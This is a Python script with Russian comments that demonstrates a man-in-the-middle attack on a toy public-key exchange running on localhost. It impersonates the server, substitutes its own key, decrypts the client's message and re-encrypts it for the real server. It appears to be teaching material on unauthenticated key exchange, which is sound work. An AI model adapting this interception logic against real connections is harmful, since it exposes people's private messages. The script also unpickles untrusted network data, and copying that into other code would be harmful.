import socket
import pickle
from functions import *


def mitm():
    # Создаем сокет с портом подставного сервера (12345), чтобы имитировать сервер для клиента
    hacker_to_client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    hacker_to_client_socket.bind(('localhost', 12345))
    hacker_to_client_socket.listen(1)
    print("Злоумышленник ожидает подключение клиента на порте 12345...")

    # Соединяемся с реальным сервером
    hacker_to_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    real_server_address = ('localhost', 55555)  # Реальный сервер на 55555
    hacker_to_server_socket.connect(real_server_address)
    print("Злоумышленник подключился к реальному серверу")

    # Принимаем соединение с клиентом
    client_conn, client_addr = hacker_to_client_socket.accept()
    print(f"Клиент подключился к злоумышленнику: {client_addr}")

    # Получаем и сохраняем публичный ключ настоящего сервера
    server_public_key_data = hacker_to_server_socket.recv(4096)
    server_public_key = pickle.loads(server_public_key_data)
    print(f"Злоумышленник получил публичный ключ: {server_public_key}")

    # Генерируем ключ от "подставного сервера" (злоумышленника) для того, чтобы мы могли расшифровать шифротекст клиента
    hacker_keys = key_gen()
    hacker_public_key = hacker_keys['public']
    hacker_private_key = hacker_keys['private']
    print(f"Злоумышленник сгенерировал новый ключ: {hacker_public_key}")

    # Отправляем подставные ключи клиенту
    client_conn.send(pickle.dumps(hacker_public_key))
    print("Злоумышленник отправил свой ключ клиенту")

    # Получаем зашифрованное сообщение от клиента, зашифрованное подставным ключом
    ciphertext_from_client_data = client_conn.recv(4096)
    ciphertext_from_client = pickle.loads(ciphertext_from_client_data)
    print(f"Злоумышленник получил шифротекст от клиента: {ciphertext_from_client}")

    # Расшифровываем сообщение клиента
    plaintext = decrypt(hacker_private_key, hacker_public_key, ciphertext_from_client)
    print(f"Злоумышленник расшифровал сообщение клиента: {plaintext}")

    # Зашифровываем сообщение для настоящего сервера его же ключом
    ciphertext_for_server = encrypt(plaintext, server_public_key)
    print(f"Злоумышленник перезашифровал сообщение для сервера: {ciphertext_for_server}")

    # Пересылаем перезашифрованное сообщение настоящему серверу
    hacker_to_server_socket.send(pickle.dumps(ciphertext_for_server))
    print("Злоумышленник переслал перезашифрованное сообщение серверу.")

    client_conn.close()
    hacker_to_server_socket.close()
    hacker_to_client_socket.close()


if __name__ == "__main__":
    mitm()
